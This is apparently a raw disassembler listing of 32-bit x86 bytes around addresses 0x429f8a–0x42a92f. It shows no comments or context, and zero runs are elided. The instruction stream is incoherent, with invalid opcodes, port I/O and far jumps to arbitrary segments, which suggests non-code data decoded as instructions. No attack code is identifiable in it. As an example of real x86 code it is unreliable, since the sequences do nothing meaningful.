  429f8a:	add    BYTE PTR [eax],al
  429f8c:	pop    ss
  429f8d:	test   esi,edi
  429f8f:	loopne 0x429f78
  429f91:	popf   
  429f92:	cwde   
  429f93:	dec    eax
  429f94:	or     ebx,DWORD PTR [ebp-0x13]
  429f97:	stos   DWORD PTR es:[edi],eax
  429f98:	inc    ecx
  429f99:	in     al,0x70
  429f9b:	cmc    
  429f9c:	sbb    eax,0xd76494e9
  429fa1:	mov    ds:0xc0a79eb4,al
  429fa6:	std    
  429fa7:	pop    ss
  429fa8:	fstp   st(1)
  429faa:	mov    ebx,0x33bcdaf6
  429faf:	dec    edx
  429fb0:	into   
  429fb1:	jb     0x42a015
  429fb3:	aaa    
  429fb4:	jmp    0x7523:0x40a03d84
  429fbb:	push   ebx
  429fbc:	jmp    FWORD PTR [ebp-0xc2b9deb]
  429fc2:	in     eax,0xfa
  429fc4:	in     al,0x9a
  429fc6:	xchg   BYTE PTR [edx],bh
  429fc8:	lea    edi,[esi-0x50d69091]
  429fce:	jl     0x429f58
  429fd0:	adc    BYTE PTR [ecx-0x5641dd0a],bl
  429fd6:	sub    al,0x3f
  429fd8:	test   DWORD PTR [ebx+0x2f],0x1e2ab75f
  429fdf:	retf   0x34f2
  429fe2:	cmp    BYTE PTR [ebx],ch
  429fe4:	(bad)
  429fe9:	rol    ebx,cl
  429feb:	sub    bl,cl
  429fed:	fmul   QWORD PTR [eax-0x50]
  429ff0:	ror    BYTE PTR [ebx+0x18766b5b],1
  429ff6:	push   esp
  429ff7:	mov    dh,BYTE PTR ds:0xe12792b3
  429ffd:	and    eax,0x19d2fbbe
  42a002:	cld    
  42a003:	out    0x72,al
  42a005:	rcl    DWORD PTR [ebp-0x59],cl
  42a008:	cmp    BYTE PTR [esi],bl
  42a00a:	stos   BYTE PTR es:[edi],al
  42a00b:	clc    
  42a00c:	dec    sp
  42a00e:	shl    DWORD PTR [ebp-0x65],0x5e
  42a012:	popa   
  42a013:	inc    esp
  42a014:	cmp    BYTE PTR [esp+eiz*8-0x4afa21d7],bh
  42a01b:	jbe    0x42a062
  42a01d:	aas    
  42a01e:	leave  
  42a01f:	inc    esi
  42a020:	das    
  42a021:	add    BYTE PTR [ebp+0x78f54439],bh
  42a027:	inc    eax
  42a028:	cmp    ebp,eax
  42a02a:	and    eax,0xc38cf788
  42a02f:	add    eax,0x8b81595a
  42a034:	and    ah,dl
  42a036:	das    
  42a037:	add    DWORD PTR [ecx],ebx
  42a039:	rcl    DWORD PTR [ebx+ebx*1],1
  42a03c:	adc    dh,BYTE PTR [eax+0x73e357a2]
  42a042:	in     al,0xd3
  42a044:	pop    ds
  42a045:	jge    0x429fe3
  42a047:	and    ebx,DWORD PTR [esi-0x245fffe3]
  42a04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a04e:	and    ebx,esp
  42a050:	sub    ah,bl
  42a052:	xchg   esp,eax
  42a053:	add    ecx,esp
  42a055:	inc    eax
  42a056:	retf   0xc9a9
  42a059:	ror    edi,1
  42a05b:	mov    ebp,0x3517a47a
  42a060:	and    BYTE PTR [ecx+0x13],0x8
  42a064:	call   0x24e56b6
  42a069:	mov    ?,WORD PTR [edx+0x7a]
  42a06c:	sub    dl,BYTE PTR [ebx+0x30cfe715]
  42a072:	pop    ds
  42a073:	add    al,0x19
  42a075:	(bad)  
  42a076:	in     al,dx
  42a077:	repz xor BYTE PTR [ecx+0x43],ah
  42a07b:	daa    
  42a07c:	jmp    0xa220d3b3
  42a081:	xchg   ebx,eax
  42a082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a083:	sub    al,0x29
  42a085:	add    al,0xe
  42a087:	loop   0x42a0f7
  42a089:	ss popf 
  42a08b:	(bad)  
  42a08c:	outs   dx,DWORD PTR ds:[esi]
  42a08d:	jae    0x42a084
  42a08f:	cmp    BYTE PTR [eax],al
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	mov    BYTE PTR [edi],0xa0
  42a102:	cmp    DWORD PTR [edx],esi
  42a104:	mov    ecx,es
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	adc    BYTE PTR [eax+0x47d731f9],0xee
  42a113:	inc    ebp
  42a114:	mov    edx,0xde24d517
  42a119:	sti    
  42a11a:	mov    ebp,0xd75f4623
  42a11f:	jg     0x42a0b4
  42a121:	xor    al,0x47
  42a123:	daa    
  42a124:	sbb    esi,0xc7eea16f
  42a12a:	das    
  42a12b:	out    dx,al
  42a12c:	push   edx
  42a12d:	ins    DWORD PTR es:[edi],dx
  42a12e:	cdq    
  42a12f:	jo     0x42a0ef
  42a131:	push   ecx
  42a132:	jmp    0xf39e25ff
  42a137:	(bad)  
  42a138:	add    cl,cl
  42a13a:	fcomp  DWORD PTR [eax]
  42a13c:	inc    esp
  42a13d:	cli    
  42a13e:	xor    BYTE PTR [edi],bl
  42a140:	or     edi,DWORD PTR [eiz*1-0x539d3d7d]
  42a147:	sub    dh,cl
  42a149:	mov    DWORD PTR [ecx-0xf],ecx
  42a14c:	push   0x9
  42a14e:	push   edx
  42a14f:	xchg   BYTE PTR [edx+0x75e8695a],ah
  42a155:	rol    BYTE PTR [eax+0x28],0xcd
  42a159:	out    dx,eax
  42a15a:	jae    0x42a184
  42a15c:	mov    esi,0xbf569b2a
  42a161:	cdq    
  42a162:	sub    ebx,eax
  42a164:	mov    edi,ss
  42a166:	adc    eax,DWORD PTR [edx]
  42a168:	dec    edx
  42a169:	sar    BYTE PTR [edi+eiz*8-0x7b],0x7b
  42a16e:	pusha  
  42a16f:	cdq    
  42a170:	adc    esi,edx
  42a172:	and    DWORD PTR [ebx],eax
  42a174:	and    eax,0xf479f8a1
  42a17a:	cld    
  42a17b:	test   eax,0xc84bc7e6
  42a181:	scas   eax,DWORD PTR es:[edi]
  42a182:	dec    edx
  42a183:	(bad)  
  42a185:	ins    BYTE PTR es:[edi],dx
  42a186:	leave  
  42a187:	or     BYTE PTR [edi],bl
  42a189:	nop
  42a18a:	lea    edx,[ecx+ebx*4+0xbdb1577]
  42a191:	sar    DWORD PTR [edx-0x502ef2ff],0xa7
  42a198:	lds    ecx,FWORD PTR [ebp-0x1d]
  42a19b:	or     ch,bl
  42a19d:	jbe    0x42a165
  42a19f:	pop    esi
  42a1a0:	push   0xffffff85
  42a1a2:	xchg   edi,eax
  42a1a3:	push   edx
  42a1a4:	pusha  
  42a1a5:	push   ss
  42a1a6:	popa   
  42a1a7:	ins    DWORD PTR es:[edi],dx
  42a1a8:	or     bh,cl
  42a1aa:	cmp    BYTE PTR [ebx+0x60],bl
  42a1ad:	mov    bh,0x6c
  42a1af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1b0:	mov    edx,0xe450f427
  42a1b5:	cmp    ch,BYTE PTR [ebx-0x2bb8fa4b]
  42a1bb:	ds and al,bl
  42a1be:	inc    ebx
  42a1bf:	or     DWORD PTR [ecx],ecx
  42a1c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1c2:	mov    al,ds:0xb464057a
  42a1c7:	outs   dx,BYTE PTR ds:[esi]
  42a1c8:	sbb    al,0x8c
  42a1ca:	scas   eax,DWORD PTR es:[edi]
  42a1cb:	fistp  DWORD PTR [eax+0x7]
  42a1ce:	repz jmp 0xaf31da30
  42a1d4:	sbb    DWORD PTR [eax-0x5aa39a55],esp
  42a1da:	mov    esi,0xc07df3db
  42a1df:	pop    ebx
  42a1e0:	adc    BYTE PTR [ebx+0x19],ah
  42a1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1e4:	sbb    DWORD PTR [ebx+0x34],edi
  42a1e7:	fimul  DWORD PTR [esi+0x11ba2f15]
  42a1ed:	mov    eax,0xe6c5353d
  42a1f2:	call   0xbd22:0xa1d840f6
  42a1f9:	mov    esi,0xefe59a0c
  42a1fe:	out    dx,eax
  42a1ff:	mov    dh,0xec
  42a201:	inc    ebp
  42a202:	dec    BYTE PTR [ebp+0x6b]
  42a205:	imul   esi,DWORD PTR [ebp+eiz*1+0x7dcf66cc],0x59
  42a20d:	adc    ecx,DWORD PTR [edi+0x72]
	...
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	(bad)  [esi+0x39]
  42a282:	push   cs
  42a283:	or     edx,DWORD PTR [eax+0x40001c2]
  42a289:	add    DWORD PTR [eax],eax
  42a28b:	add    BYTE PTR [edi],ch
  42a28d:	inc    ebx
  42a28e:	out    0x46,eax
  42a290:	inc    edx
  42a291:	pop    ds
  42a292:	mov    edx,0x21994947
  42a297:	pop    ebp
  42a298:	push   esi
  42a299:	fdiv   DWORD PTR [edx-0x4b6655c4]
  42a29f:	inc    ecx
  42a2a0:	out    dx,eax
  42a2a1:	ds xor eax,0x8d5324c4
  42a2a7:	sbb    eax,0xa10d773f
  42a2ac:	xchg   ebp,eax
  42a2ad:	fs cdq 
  42a2af:	pop    edi
  42a2b0:	add    dl,dh
  42a2b2:	dec    ecx
  42a2b3:	jecxz  0x42a2ea
  42a2b5:	leave  
  42a2b6:	je     0x42a26c
  42a2b8:	scas   al,BYTE PTR es:[edi]
  42a2b9:	(bad)  [ecx+esi*4+0x76]
  42a2bd:	je     0x42a284
  42a2bf:	push   0xffffffba
  42a2c1:	fdivr  st,st(3)
  42a2c3:	xchg   ebp,eax
  42a2c4:	adc    BYTE PTR [eax],bh
  42a2c6:	mov    eax,0xec9200dc
  42a2cb:	pushf  
  42a2cc:	or     BYTE PTR [ecx],ch
  42a2ce:	fs pop ds
  42a2d0:	adc    edx,DWORD PTR [eax]
  42a2d2:	xlat   BYTE PTR ds:[ebx]
  42a2d3:	inc    edi
  42a2d4:	jmp    0x42a319
  42a2d6:	or     esi,eax
  42a2d8:	imul   eax,esp,0xa95c5185
  42a2de:	mov    bh,0xf
  42a2e0:	fs int 0xcf
  42a2e3:	dec    ecx
  42a2e4:	fistp  QWORD PTR [edi+0x2a]
  42a2e7:	sbb    BYTE PTR [edx+0x5bdd92f6],al
  42a2ed:	pop    esp
  42a2ee:	cdq    
  42a2ef:	loopne 0x42a2e7
  42a2f1:	out    0x63,al
  42a2f3:	imul   esp,ecx,0xffffffcc
  42a2f6:	leave  
  42a2f7:	bound  esi,QWORD PTR [eax+0x26]
  42a2fa:	dec    esp
  42a2fb:	lfs    ebp,FWORD PTR [ebp+0x10]
  42a2ff:	fadd   DWORD PTR [ecx]
  42a301:	cwde   
  42a302:	fcomp  QWORD PTR [esi]
  42a304:	mov    eax,0x7aa66ba1
  42a309:	sub    dl,BYTE PTR [eax]
  42a30b:	or     edx,DWORD PTR [ecx]
  42a30d:	and    ecx,DWORD PTR [esi+0x6b28c962]
  42a313:	sbb    eax,0x646b55db
  42a318:	addr16 dec esi
  42a31a:	(bad)  
  42a31b:	test   al,0x6f
  42a31d:	mov    ah,0x6a
  42a31f:	cmp    ah,al
  42a321:	xor    eax,DWORD PTR [ebx]
  42a323:	sbb    cl,BYTE PTR [ebp-0x130d3a33]
  42a329:	push   ss
  42a32a:	stos   DWORD PTR es:[edi],eax
  42a32b:	cmp    ecx,DWORD PTR [ecx+0x63526547]
  42a331:	pop    eax
  42a332:	pop    ds
  42a333:	or     ebp,DWORD PTR [edi-0x68]
  42a336:	inc    ebx
  42a337:	xchg   ebp,eax
  42a338:	lea    esi,[esi]
  42a33a:	sbb    BYTE PTR [edi-0x1d],ah
  42a33d:	addr16 push 0xda99cd25
  42a343:	sub    BYTE PTR [edi],0x74
  42a346:	int    0xdf
  42a348:	mov    esp,ecx
  42a34a:	push   ebx
  42a34b:	dec    eax
  42a34c:	jbe    0x42a355
  42a34e:	pop    esp
  42a34f:	mov    esp,0x94e071d2
  42a354:	pop    es
  42a355:	cmc    
  42a356:	add    bh,BYTE PTR [ebx]
  42a358:	shr    BYTE PTR [ebx+0x749bd9ec],1
  42a35e:	les    esp,FWORD PTR [ebp-0x37]
  42a361:	arpl   WORD PTR [edx-0x86d536d],cx
  42a367:	in     al,dx
  42a368:	inc    edx
  42a369:	je     0x42a3d1
  42a36b:	jmp    0xce5faf7b
  42a370:	pop    esp
  42a371:	push   eax
  42a372:	int    0xb1
  42a374:	cdq    
  42a375:	mov    ah,dh
  42a377:	jne    0x42a3ba
  42a379:	mov    dl,0x10
  42a37b:	inc    edi
  42a37c:	out    0x66,al
  42a37e:	call   0x8a31:0xf356e938
  42a385:	nop
  42a386:	inc    edi
  42a387:	ins    BYTE PTR es:[edi],dx
  42a388:	out    0x88,al
  42a38a:	pop    eax
  42a38b:	and    bh,cl
  42a38d:	cld    
  42a38e:	enter  0x8e,0x0
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x688b053d
  42a403:	push   ecx
  42a404:	xchg   esp,eax
  42a405:	ret    
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	sbb    edx,DWORD PTR [ebp-0x5a]
  42a40f:	mov    eax,ds:0x862aaf3a
  42a414:	jb     0x42a431
  42a416:	and    eax,DWORD PTR [edx]
  42a418:	gs mov cl,0xc0
  42a41b:	mov    bh,0x51
  42a41d:	ficomp WORD PTR [ebx+0x7ab6d807]
  42a423:	aad    0x62
  42a425:	lds    eax,FWORD PTR [edi-0x29]
  42a428:	test   eax,0x7bf3c980
  42a42d:	mov    dl,0x3c
  42a42f:	mov    ah,0x14
  42a431:	xor    DWORD PTR ds:0x84af8452,0x6d
  42a438:	cmp    DWORD PTR [ecx],ebx
  42a43a:	and    al,0x88
  42a43c:	pop    es
  42a43d:	fst    QWORD PTR [ebx+esi*8-0x76e31a66]
  42a444:	push   cs
  42a445:	dec    edi
  42a446:	sbb    BYTE PTR [esi],0x57
  42a449:	daa    
  42a44a:	stos   DWORD PTR es:[edi],eax
  42a44b:	inc    ebx
  42a44c:	int3   
  42a44d:	test   al,0xfc
  42a44f:	or     BYTE PTR [esi-0x7993788a],bl
  42a455:	sbb    al,0x6e
  42a457:	inc    edx
  42a458:	push   edi
  42a459:	sub    al,BYTE PTR [edx]
  42a45b:	adc    ecx,edi
  42a45d:	cmc    
  42a45e:	mov    dh,0xec
  42a460:	lods   eax,DWORD PTR ds:[esi]
  42a461:	imul   ebx,DWORD PTR [edx],0x11
  42a464:	mov    esi,0xeb6a3a6a
  42a469:	adc    esp,edi
  42a46b:	xor    DWORD PTR [ebx-0x1e],eax
  42a46e:	xor    dh,BYTE PTR [esi]
  42a470:	jae    0x42a4bd
  42a472:	out    0xa5,eax
  42a474:	inc    edx
  42a475:	loop   0x42a42a
  42a477:	mov    BYTE PTR [edi],ah
  42a479:	leave  
  42a47a:	call   FWORD PTR [ecx]
  42a47c:	fisubr DWORD PTR es:[ecx+0x643984a7]
  42a483:	pop    ecx
  42a484:	test   DWORD PTR [edi+eax*8+0x5d],esp
  42a488:	inc    ebp
  42a489:	hlt    
  42a48a:	jmp    0xd5253853
  42a48f:	nop
  42a490:	aam    0x1e
  42a492:	adc    BYTE PTR es:[edi-0x300ff175],cl
  42a499:	inc    ecx
  42a49a:	jecxz  0x42a4e1
  42a49c:	jbe    0x42a4ce
  42a49e:	retf   0x68c4
  42a4a1:	add    ch,cl
  42a4a3:	test   al,0x78
  42a4a5:	je     0x42a51a
  42a4a7:	push   ecx
  42a4a8:	inc    ebp
  42a4a9:	shr    ch,0x20
  42a4ac:	out    0x54,al
  42a4ae:	int3   
  42a4af:	sbb    edi,ecx
  42a4b1:	(bad)  
  42a4b2:	ja     0x42a4c2
  42a4b4:	in     al,dx
  42a4b5:	push   ecx
  42a4b6:	lds    ecx,FWORD PTR [edi]
  42a4b8:	or     DWORD PTR [ebp+0x32],esp
  42a4bb:	ins    DWORD PTR es:[edi],dx
  42a4bc:	mov    ss,WORD PTR [edx-0x3a8b0f6b]
  42a4c2:	push   esi
  42a4c3:	jmp    0x8048:0x3761f182
  42a4ca:	adc    DWORD PTR [esi+0x46],esi
  42a4cd:	ret    
  42a4ce:	sbb    edx,DWORD PTR [ebx+0x26407158]
  42a4d4:	call   0x697ee54e
  42a4d9:	xor    ebp,DWORD PTR [ebp+ebx*4-0x48]
  42a4dd:	sti    
  42a4de:	ds scas al,BYTE PTR es:[edi]
  42a4e0:	and    ch,0xac
  42a4e3:	adc    esi,edi
  42a4e5:	dec    ebx
  42a4e6:	or     al,0x6f
  42a4e8:	adc    dl,0xd4
  42a4eb:	mov    DWORD PTR [esi+0x44e2c0e8],eax
  42a4f1:	shl    BYTE PTR [edx],cl
  42a4f3:	scas   eax,DWORD PTR es:[edi]
  42a4f4:	arpl   WORD PTR [eax-0x40ab39b9],ax
  42a4fa:	cmp    DWORD PTR ds:0x2e826d44,esi
  42a500:	lods   eax,DWORD PTR ds:[esi]
  42a501:	and    ch,BYTE PTR ds:0xbb0bcbf2
  42a507:	mov    cl,0xc9
  42a509:	fild   WORD PTR [edi-0x15]
  42a50c:	pop    ecx
  42a50d:	and    BYTE PTR [edi+eiz*8],cl
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x6ca2c29f
  42a583:	repz cwde 
  42a585:	les    eax,FWORD PTR [ecx]
  42a587:	add    BYTE PTR [ecx+eax*1],al
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	dec    ebx
  42a58d:	mov    WORD PTR [ecx],ss
  42a58f:	mov    ch,0x62
  42a591:	sub    BYTE PTR [esp+edi*1-0x23dc8e8b],ch
  42a598:	cs aaa 
  42a59a:	ds mov eax,0x8a4ea504
  42a5a0:	xchg   ecx,eax
  42a5a1:	lahf   
  42a5a2:	jl     0x42a61d
  42a5a4:	(bad)  
  42a5a5:	sub    BYTE PTR [esi+0x1b],cl
  42a5a8:	inc    esp
  42a5a9:	es test eax,0x2218d320
  42a5af:	mov    edx,0xae07479e
  42a5b4:	push   edi
  42a5b5:	or     ah,BYTE PTR [edi+0x40]
  42a5b8:	and    ebx,ebx
  42a5ba:	es stos DWORD PTR es:[edi],eax
  42a5bc:	xor    esp,esp
  42a5be:	jg     0x42a5f2
  42a5c0:	je     0x42a588
  42a5c2:	and    DWORD PTR [esi],eax
  42a5c4:	push   cs
  42a5c5:	push   esp
  42a5c6:	mov    edi,0x5f1e338d
  42a5cb:	inc    esp
  42a5cc:	mov    ebp,0x21567e37
  42a5d1:	xor    edi,ebx
  42a5d3:	test   esp,0x44330dd1
  42a5d9:	sub    ebx,DWORD PTR [ebp+0x15]
  42a5dc:	jne    0x42a606
  42a5de:	je     0x42a62b
  42a5e0:	gs aas 
  42a5e2:	mov    esp,0x91d968d9
  42a5e7:	rep ins BYTE PTR es:[edi],dx
  42a5e9:	mov    DWORD PTR [ebx+0x7dd9f9cc],0xb3f68ff1
  42a5f3:	xor    eax,0xeb35f735
  42a5f8:	cmc    
  42a5f9:	fld    QWORD PTR [ebx]
  42a5fb:	add    DWORD PTR [ecx],edi
  42a5fd:	enter  0x8e92,0x50
  42a601:	mov    al,0x51
  42a603:	sbb    al,0xd7
  42a605:	dec    ebx
  42a606:	sub    BYTE PTR [esi+0x77b02f14],ch
  42a60c:	mov    edx,0x2d8075ee
  42a611:	loope  0x42a5d9
  42a613:	and    al,0xa7
  42a615:	fisttp QWORD PTR [ecx-0x5]
  42a618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a619:	jnp    0x42a5ca
  42a61b:	mov    edi,0x5bd83afc
  42a620:	arpl   WORD PTR [esi+0x53b70fcd],ax
  42a626:	cli    
  42a627:	call   0x9fcfeb0b
  42a62c:	jbe    0x42a5fa
  42a62e:	cmp    BYTE PTR [edi],bl
  42a630:	outs   dx,DWORD PTR ds:[esi]
  42a631:	rcl    ah,cl
  42a633:	add    BYTE PTR [edx-0x21],dl
  42a636:	cmp    BYTE PTR [eax],bl
  42a638:	xchg   BYTE PTR [ecx+0x3],bh
  42a63b:	fstp   DWORD PTR [ecx-0x21506829]
  42a641:	out    0xe9,eax
  42a643:	dec    edx
  42a644:	int3   
  42a645:	cmp    edi,DWORD PTR [eax-0x51]
  42a648:	lock push ds
  42a64a:	fs popa 
  42a64c:	dec    ebp
  42a64d:	inc    ebp
  42a64e:	push   fs
  42a650:	xor    edi,DWORD PTR [esi+0x3850d610]
  42a656:	out    dx,eax
  42a657:	sbb    BYTE PTR [ebx-0x21d3f3be],dl
  42a65d:	mov    esp,edi
  42a65f:	or     DWORD PTR [edi+0x45],edx
  42a662:	sub    BYTE PTR [ecx+0x5ad07fa6],bh
  42a668:	jmp    0x42a6c3
  42a66a:	mov    ah,0xbf
  42a66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a66d:	call   0xa2db1a93
  42a672:	(bad)  
  42a673:	bound  ebx,QWORD PTR [esi+0x72a9f411]
  42a679:	inc    esp
  42a67a:	adc    al,0xe5
  42a67c:	loopne 0x42a6f5
  42a67e:	stos   DWORD PTR es:[edi],eax
  42a67f:	std    
  42a680:	in     al,dx
  42a681:	xchg   BYTE PTR [ebp+0x5d],dh
  42a684:	xor    al,0xf6
  42a686:	mov    edi,0xd4a5a3f7
  42a68b:	dec    DWORD PTR [edi-0x30]
  42a68e:	push   0x38
	...
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x1bb8131c],0x9c9f4b2b
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	xchg   ecx,eax
  42a70d:	cmp    edi,DWORD PTR [ecx-0x6d]
  42a710:	dec    eax
  42a711:	ins    DWORD PTR es:[edi],dx
  42a712:	retf   0xfba6
  42a715:	sbb    eax,0xbd6b5316
  42a71a:	or     dl,BYTE PTR [edi]
  42a71c:	xchg   si,ax
  42a71e:	adc    edx,eax
  42a720:	sub    bl,0x94
  42a723:	adc    ch,ah
  42a725:	imul   ebp,DWORD PTR [ecx-0x2e],0xd0d0c58b
  42a72c:	ficomp WORD PTR [ecx]
  42a72e:	popa   
  42a72f:	xor    BYTE PTR [esi+0x2e],cl
  42a732:	mov    esp,?
  42a734:	pop    esi
  42a735:	(bad)  
  42a736:	hlt    
  42a737:	and    BYTE PTR [eax],bh
  42a739:	jmp    0x42a707
  42a73b:	sub    BYTE PTR [eax-0x7c],dh
  42a73e:	scas   al,BYTE PTR es:[edi]
  42a73f:	push   ds
  42a740:	pop    ebx
  42a741:	and    BYTE PTR [esi-0x30],dl
  42a744:	scas   al,BYTE PTR es:[edi]
  42a745:	mov    ecx,0x3b0565a
  42a74a:	sbb    eax,0x11a842ce
  42a74f:	imul   BYTE PTR [ebx]
  42a751:	mov    DWORD PTR [ecx],ebx
  42a753:	not    esi
  42a755:	dec    ebp
  42a756:	nop
  42a757:	cwde   
  42a758:	lods   eax,DWORD PTR ds:[esi]
  42a759:	jb     0x42a6f3
  42a75b:	nop
  42a75c:	fistp  WORD PTR [esi-0x4c]
  42a75f:	data16 cli 
  42a761:	lds    ebp,FWORD PTR [ebx]
  42a763:	push   ecx
  42a764:	cs pop eax
  42a766:	adc    edx,DWORD PTR [edx-0x153ca523]
  42a76c:	dec    eax
  42a76d:	in     eax,0x70
  42a76f:	push   ebx
  42a770:	xlat   BYTE PTR ds:[ebx]
  42a771:	cli    
  42a772:	rcl    BYTE PTR [edi+0x20],1
  42a775:	adc    DWORD PTR [edx-0x5d4f2ed],ebp
  42a77b:	clc    
  42a77c:	pop    ss
  42a77d:	loopne 0x42a789
  42a77f:	outs   dx,BYTE PTR ds:[esi]
  42a780:	jae    0x42a722
  42a782:	cmp    al,0x98
  42a784:	inc    edx
  42a785:	icebp  
  42a786:	aas    
  42a787:	xchg   BYTE PTR [ebp+0x474c0bd5],bl
  42a78d:	cdq    
  42a78e:	imul   ebp,DWORD PTR [edi-0x19229cb4],0x16e63a78
  42a798:	mov    ebx,es
  42a79a:	arpl   WORD PTR [ebx+0x1e7095c1],sp
  42a7a0:	xor    BYTE PTR [ebp-0x2606a30e],bl
  42a7a6:	inc    esp
  42a7a7:	jg     0x42a73e
  42a7a9:	imul   eax,edi,0x6f739557
  42a7af:	or     ebx,ecx
  42a7b1:	adc    ebp,DWORD PTR [edi+eiz*4-0x1f37d57a]
  42a7b8:	push   ss
  42a7b9:	arpl   WORD PTR [ebx-0x62ebab6d],bx
  42a7bf:	(bad)  
  42a7c0:	shl    dl,1
  42a7c2:	and    esi,eax
  42a7c4:	jmp    0xb9aa23bc
  42a7c9:	out    0x44,al
  42a7cb:	mov    edi,0xcebbed51
  42a7d0:	cmc    
  42a7d1:	aam    0xcb
  42a7d3:	loop   0x42a75b
  42a7d5:	xor    esp,DWORD PTR [edx+0x16]
  42a7d8:	(bad)  
  42a7da:	fld    DWORD PTR [ebx]
  42a7dc:	sbb    eax,0x617d377c
  42a7e1:	sbb    al,0x48
  42a7e3:	jns    0x42a841
  42a7e5:	cmc    
  42a7e6:	lock test eax,0xbd62acab
  42a7ec:	mov    ebx,0x677db22
  42a7f1:	push   ebx
  42a7f2:	test   al,0xcd
  42a7f4:	popa   
  42a7f5:	inc    ebx
  42a7f6:	or     esi,esi
  42a7f8:	fndisi(8087 only) 
  42a7fa:	in     al,0x66
  42a7fc:	push   ecx
  42a7fd:	sbb    bl,BYTE PTR [ebp-0x2a9325ca]
  42a803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a804:	leave  
  42a805:	pop    eax
  42a806:	(bad)  
  42a807:	xchg   esi,eax
  42a808:	ja     0x42a790
  42a80a:	retf   
  42a80b:	inc    esi
  42a80c:	adc    ebx,ecx
  42a80e:	test   DWORD PTR [esi+0x0],ebx
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	out    0x89,eax
  42a882:	int3   
  42a883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a884:	mov    al,ds:0x40001c6
  42a889:	add    DWORD PTR [eax],eax
  42a88b:	add    BYTE PTR [ebp-0x63],al
  42a88e:	nop
  42a88f:	out    dx,al
  42a890:	push   es
  42a891:	cmp    al,0xee
  42a893:	sbb    BYTE PTR [edx+0x12167cdb],ah
  42a899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a89a:	mov    DWORD PTR [eax-0x7f],ebp
  42a89d:	mov    ds:0xd7eed0c4,eax
  42a8a2:	retf   0x311
  42a8a5:	leave  
  42a8a6:	add    BYTE PTR [edi+0x28],0xf7
  42a8aa:	pop    edx
  42a8ab:	js     0x42a8e8
  42a8ad:	add    eax,0xf8263c7b
  42a8b2:	sub    eax,ebp
  42a8b4:	xor    BYTE PTR [edx-0x6],ch
  42a8b7:	lods   al,BYTE PTR ds:[esi]
  42a8b8:	fisub  DWORD PTR [ebx]
  42a8ba:	mov    al,ds:0xc873ea49
  42a8bf:	in     eax,dx
  42a8c0:	aaa    
  42a8c1:	ffree  st(7)
  42a8c3:	in     eax,dx
  42a8c4:	(bad)  
  42a8c5:	add    DWORD PTR [ecx],ebx
  42a8c7:	jb     0x42a866
  42a8c9:	mov    ah,0xd5
  42a8cb:	sahf   
  42a8cc:	ret    0xdee0
  42a8cf:	jae    0x42a8ad
  42a8d1:	and    DWORD PTR [ebp-0x49],ebp
  42a8d4:	lods   eax,DWORD PTR ds:[esi]
  42a8d5:	pop    edi
  42a8d6:	xor    DWORD PTR [edi+0x12834f48],0xffffffc1
  42a8dd:	mov    ds:0xbb10ee4a,al
  42a8e2:	(bad)  
  42a8e3:	jno    0x42a89e
  42a8e5:	mov    ah,0x24
  42a8e7:	jo     0x42a8a5
  42a8e9:	stos   DWORD PTR es:[edi],eax
  42a8ea:	leave  
  42a8eb:	mov    esi,0xcac968a
  42a8f0:	ret    
  42a8f1:	inc    esi
  42a8f2:	stos   BYTE PTR es:[edi],al
  42a8f3:	mov    eax,0x1d272dfb
  42a8f8:	mov    ds:0xc7c9d349,eax
  42a8fd:	test   DWORD PTR [ecx],edx
  42a8ff:	push   0xffffffb2
  42a901:	(bad)  
  42a902:	(bad)  
  42a903:	push   ds
  42a904:	aaa    
  42a905:	pop    edx
  42a906:	pop    edx
  42a907:	sub    eax,0x8bc05853
  42a90c:	iret   
  42a90d:	sbb    ecx,DWORD PTR [eax-0x58]
  42a910:	push   ds
  42a911:	jns    0x42a906
  42a913:	cmp    BYTE PTR [ebx-0x36],bl
  42a916:	cmp    ch,BYTE PTR [edx]
  42a918:	sbb    ebx,ecx
  42a91a:	loop   0x42a8af
  42a91c:	jecxz  0x42a987
  42a91e:	cmp    eax,0x606004c
  42a923:	je     0x42a8d3
  42a925:	push   esp
  42a926:	pusha  
  42a927:	xor    eax,0x40431a30
  42a92c:	xchg   ebx,eax
  42a92d:	jo     0x42a9a5
  42a92f:	or     dh,al
